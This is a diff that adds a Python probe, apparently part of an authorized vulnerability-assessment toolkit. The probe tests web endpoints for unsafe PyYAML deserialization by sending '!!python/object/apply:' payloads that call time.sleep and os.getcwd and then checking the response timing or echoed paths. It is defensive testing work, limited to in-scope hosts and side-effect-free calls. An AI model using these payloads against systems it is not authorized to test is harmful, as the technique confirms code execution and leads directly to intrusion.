@@ -1,0 +1,196 @@
+#!/usr/bin/env python3
+"""Deterministic YAML-deserialization vulnerability probe.
+
+Tests whether an endpoint that accepts YAML (``Content-Type: text/yaml``,
+``application/yaml``, or a form field named ``yaml``/``config``) deserializes
+it with an unsafe loader (``yaml.load`` without ``SafeLoader``). Unsafe
+loading accepts ``!!python/object/apply:`` tags that construct arbitrary
+Python objects at parse time — the textbook RCE primitive on PyYAML-backed
+apps that forgot to switch to ``yaml.safe_load``.
+
+Detection strategy (NON-DESTRUCTIVE, in-band):
+  1. Submit a YAML payload whose ``!!python/object/apply:time.sleep`` entry
+     requests a 5-second sleep. If the response takes >= baseline+4 seconds
+     TWICE in a row, the loader executed the tag — confirmed deserialization.
+  2. Fallback: submit a tag that triggers a ``!!python/object/apply:os.getcwd``
+     — a value-returning function. If the response body echoes the returned
+     string back (common in form-preview flows), it's confirmed.
+
+The payload uses ``time.sleep`` / ``os.getcwd`` (the safest side-effect-free
+proofs) — NEVER ``os.system``, ``subprocess``, or any shell/file write.
+
+Emits ONE JSON record to stdout:
+    {"findings": [{"type": "yaml_deserialization", "severity": "critical",
+                   "url": "<url>", "evidence": "<...>", "confirmed": true}],
+     "trace":    [{"url", "status", "ct", "elapsed", "note"}, ...]}
+
+Safety: argv-only (no shell), bounded (6 variant payloads per URL, 10s per
+request + 10s sleep window max), in-scope-only, read-only tags only. Fails
+SAFE on every error.
+"""
+from __future__ import annotations
+
+import argparse
+import json
+import os
+import sys
+import time
+from urllib.parse import urlparse
+
+try:
+    import requests
+except Exception as e:
+    print(json.dumps({"error": f"requests not available: {e}", "findings": []}))
+    sys.exit(0)
+
+_UA = "vapt-yaml-deser-probe/1.0 (authorized assessment)"
+_TIMEOUT = 15
+_SLEEP = 5
+
+
+def _in_scope(target_host: str, url: str) -> bool:
+    try:
+        return urlparse(url).hostname == target_host
+    except Exception:
+        return False
+
+
+def _web_cookie() -> str:
+    """Load the webvuln session cookie from Redis (fail-safe → empty on any error)."""
+    run_id = os.environ.get("VAPT_RUN_ID", "").strip()
+    if not run_id:
+        return ""
+    try:
+        import redis
+        r = redis.Redis.from_url(
+            os.environ.get("VAPT_REDIS_URL", "redis://localhost:6379/0"),
+            socket_timeout=3,
+        )
+        v = r.get(f"vapt:webcookie:{run_id}")
+        return v.decode() if v else ""
+    except Exception:
+        return ""
+
+
+# Payload variants — each uses ONE Python callable that has NO side effects
+# beyond its own return value or sleep. Order: sleep (fastest proof) first.
+_SLEEP_YAML = (
+    f"!!python/object/apply:time.sleep [{_SLEEP}]\n"
+)
+_GETCWD_YAML = (
+    "!!python/object/apply:os.getcwd []\n"
+)
+
+
+def _submit(url: str, cookie: str, body: str, field: str,
+            content_type: str) -> tuple[int, str, float]:
+    """One POST attempt. Returns (status, response_text, elapsed_seconds).
+    Any exception → (0, "", 0.0) so the caller can move on."""
+    headers = {"User-Agent": _UA, "Accept": "*/*"}
+    if cookie:
+        headers["Cookie"] = cookie
+    try:
+        t0 = time.time()
+        if content_type:
+            headers["Content-Type"] = content_type
+            r = requests.post(url, data=body, headers=headers,
+                              timeout=_TIMEOUT, allow_redirects=False)
+        else:
+            r = requests.post(url, data={field: body}, headers=headers,
+                              timeout=_TIMEOUT, allow_redirects=False)
+        return (r.status_code, r.text or "", time.time() - t0)
+    except Exception:
+        return (0, "", 0.0)
+
+
+def main() -> int:
+    ap = argparse.ArgumentParser()
+    ap.add_argument("--target", required=True,
+                    help="in-scope hostname/IP; url must match")
+    ap.add_argument("--url", required=True,
+                    help="full http(s) URL that accepts YAML (POST body or form field)")
+    ap.add_argument("--field", default="yaml",
+                    help="form field name for form-encoded submission (default: yaml)")
+    args = ap.parse_args()
+    url = args.url.strip()
+    if not url.lower().startswith(("http://", "https://")):
+        print(json.dumps({"error": "url must be http(s)", "findings": []}))
+        return 0
+    if not _in_scope(args.target, url):
+        print(json.dumps({"error": "url off-scope", "findings": []}))
+        return 0
+
+    cookie = _web_cookie()
+    findings: list[dict] = []
+    trace: list[dict] = []
+
+    # Baseline latency — a harmless `!!str hello` so the server runs its
+    # dispatch path once before we try to measure a slow one.
+    base_body = "!!str hello\n"
+    for ct in ("application/yaml", "text/yaml", ""):
+        s, _, elapsed = _submit(url, cookie, base_body, args.field, ct)
+        trace.append({"url": url, "status": s, "ct": ct or "form",
+                      "elapsed": round(elapsed, 2), "note": "baseline"})
+        if s > 0:
+            baseline = elapsed
+            effective_ct = ct
+            break
+    else:
+        print(json.dumps({"error": "no baseline response", "findings": [],
+                          "trace": trace}))
+        return 0
+
+    # Attempt 1 — time.sleep proof.
+    s1, _, e1 = _submit(url, cookie, _SLEEP_YAML, args.field, effective_ct)
+    trace.append({"url": url, "status": s1, "ct": effective_ct or "form",
+                  "elapsed": round(e1, 2), "note": "sleep-1"})
+    if s1 > 0 and e1 >= baseline + (_SLEEP - 1):
+        # Confirm with a retry — one slow response could be transient.
+        s2, _, e2 = _submit(url, cookie, _SLEEP_YAML, args.field, effective_ct)
+        trace.append({"url": url, "status": s2, "ct": effective_ct or "form",
+                      "elapsed": round(e2, 2), "note": "sleep-2"})
+        if s2 > 0 and e2 >= baseline + (_SLEEP - 1):
+            findings.append({
+                "type": "yaml_deserialization", "severity": "critical",
+                "url": url,
+                "evidence": (f"time-based: unsafe yaml.load executed "
+                             f"!!python/object/apply:time.sleep "
+                             f"({e1:.1f}s + {e2:.1f}s vs baseline {baseline:.1f}s)"),
+                "confirmed": True,
+            })
+            print(json.dumps({"findings": findings, "trace": trace[:40]}))
+            return 0
+
+    # Attempt 2 — os.getcwd echo. Many apps render the submitted YAML back as
+    # part of a preview; a leaked cwd (`/app`, `/var/www`, …) is strong proof.
+    s3, body3, e3 = _submit(url, cookie, _GETCWD_YAML, args.field, effective_ct)
+    trace.append({"url": url, "status": s3, "ct": effective_ct or "form",
+                  "elapsed": round(e3, 2), "note": "getcwd"})
+    if s3 > 0 and body3:
+        import re
+        # A unix-shaped absolute path NOT present in a static page template
+        # — simple regex catches /app, /var/www, /home/<user>, etc. Avoid
+        # trivial false positives by requiring the path to be followed by
+        # NO file extension and bounded by non-path characters.
+        for m in re.finditer(r"(?<![A-Za-z0-9/])(/(?:app|var|home|root|srv|opt|usr)"
+                             r"(?:/[A-Za-z0-9_\-.]+){0,4})(?![A-Za-z0-9/])",
+                             body3):
+            path = m.group(1)
+            if "." in path.rsplit("/", 1)[-1]:
+                continue  # looks like a file, not a cwd
+            findings.append({
+                "type": "yaml_deserialization", "severity": "critical",
+                "url": url,
+                "evidence": (f"echo-based: unsafe yaml.load executed "
+                             f"!!python/object/apply:os.getcwd and the "
+                             f"result ({path}) was reflected in the response"),
+                "confirmed": True,
+            })
+            break
+
+    print(json.dumps({"findings": findings, "trace": trace[:40]}))
+    return 0
+
+
+if __name__ == "__main__":
+    raise SystemExit(main())
